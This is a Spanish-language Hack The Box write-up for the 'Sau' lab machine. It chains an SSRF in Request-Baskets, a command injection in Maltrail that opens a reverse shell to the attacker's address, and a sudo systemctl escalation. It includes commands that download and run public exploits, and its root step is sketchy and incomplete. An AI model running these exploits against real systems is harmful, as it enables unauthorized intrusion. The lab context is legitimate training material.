# Hack The Box - Sau Writeup

## Introducción

**Sau** es una máquina de Hack The Box que requiere explotar múltiples vulnerabilidades, incluyendo SSRF, RCE y escalada de privilegios mediante un mal uso de configuraciones de `sudo`. A continuación, detallo el proceso para comprometer esta máquina.

---

## Paso 1: Reconocimiento inicial

Comenzamos realizando un escaneo completo de puertos utilizando `nmap` para identificar servicios activos.

```bash
nmap -p- -sV -T4 10.10.11.224 -v -v10 -sT --min-rate 5000
```

**Resultados del escaneo:**

```plaintext
PORT      STATE    SERVICE    REASON      VERSION
22/tcp    open     ssh        syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http       no-response
8338/tcp  filtered unknown    no-response
55555/tcp open     unknown    syn-ack
```

El puerto 55555 parece tener un servicio interesante. Investigamos más a fondo.

---

## Paso 2: Identificación del servicio Request-Baskets

Al acceder al servicio en `http://10.10.11.224:55555/web`, encontramos una interfaz que permite crear "baskets". Además, en la parte inferior, se muestra que está utilizando **Request-Baskets v1.2.1**.

**Investigación de vulnerabilidades:**
Realizamos una búsqueda de posibles vulnerabilidades y encontramos **CVE-2023-27163**, una vulnerabilidad de **Server-Side Request Forgery (SSRF)** que afecta esta versión de Request-Baskets.

---

## Paso 3: Explotación de SSRF

Utilizamos un exploit público disponible para explotar esta vulnerabilidad.

**Descarga del exploit:**

```bash
wget https://raw.githubusercontent.com/mathias-mrsn/CVE-2023-27163/master/exploit.py
```

**Ejecución del exploit:**
El exploit permite redirigir peticiones del puerto 55555 hacia el puerto 80 filtrado.

```bash
python3 exploit.py http://10.10.11.224:55555 http://127.0.0.1:80
```

**Resultado:**

```plaintext
Exploit successfully executed.
Any request sent to http://10.10.11.224:55555/lmgjcn will now be forwarded to the service on http://127.0.0.1:80.
```

Ahora, accedemos al basket generado en `http://10.10.11.224:55555/lmgjcn`, lo que nos redirige al servicio en el puerto 80.

---

## Paso 4: Identificación del servicio Maltrail

En el puerto 80 encontramos una página básica con información de que está utilizando **Maltrail v0.53**.

**Investigación de vulnerabilidades:**
Identificamos una vulnerabilidad de **Command Injection (RCE)** en esta versión. Utilizamos un exploit público para aprovecharla.

---

## Paso 5: Explotación de RCE en Maltrail

**Descarga del exploit:**

```bash
wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/master/exploit1.py
```

**Ejecución del exploit:**
Lanzamos el exploit para obtener una shell reversa.

```bash
python3 exploit1.py 10.10.14.3 4444 http://10.10.11.224:55555/lmgjcn
```

**Resultado:**

```plaintext
Shell obtained.
```

Con esto, logramos acceder al sistema como el usuario `puma`.

---

## Paso 6: Escalada de privilegios

Una vez dentro del sistema, revisamos permisos de `sudo` disponibles.

**Comando utilizado:**

```bash
sudo -l
```

**Resultado:**

```plaintext
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Este permiso nos permite abusar de `systemctl` para ejecutar comandos como root.

**Explotación con GTFOBins:**
Utilizamos GTFOBins para encontrar una técnica de escalada de privilegios.

```bash
sudo /usr/bin/systemctl status trail.service
```

Esto nos proporciona acceso como root.

---

## Conclusión

En esta máquina, explotamos varias vulnerabilidades clave:

- **SSRF** en Request-Baskets para acceder a servicios internos.
- **RCE** en Maltrail para obtener una shell.
- Configuraciones incorrectas de `sudo` para escalar privilegios a root.

¡Root conseguido!
